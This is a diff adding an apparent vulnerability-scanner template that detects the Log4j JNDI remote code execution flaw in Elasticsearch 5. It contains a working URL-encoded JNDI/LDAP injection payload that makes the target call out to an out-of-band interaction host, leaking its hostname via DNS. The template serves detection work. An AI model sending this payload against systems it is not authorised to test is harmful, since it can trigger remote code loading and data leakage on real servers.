@@ -1,0 +1,33 @@
+id: elasticsearch5-log4j-rce
+brief:
+    title: Elasticsearch 5 - Remote Code Execution (Apache Log4j)
+    by: akincibor
+    level: critical
+    about: Elasticsearch 5 is susceptible to remote code execution via the Apache Log4j framework. An attacker can execute malware, obtain sensitive information, modify data, and/or gain full control over a c...
+    label:
+        - jndi
+        - log4j
+        - rce
+        - oast
+        - elasticsearch
+        - cve
+        - cve2021
+        - kev
+        - vuln
+    score: CVE-2021-44228 CVSS:10.0
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/_search?a=$%7Bjndi%3Aldap%3A%2F%2F$%7B%3A-{{rand1}}%7D$%7B%3A-{{rand2}}%7D.$%7BhostName%7D.search.{{interactsh-url}}%7D'
+      body: '{'
+      signs:
+        - "on": word
+          has:
+            - org.elasticsearch.transport
+          in: body
+          need: all
+        - "on": word
+          has:
+            - dns
+          in: interactsh_protocol
+          need: all
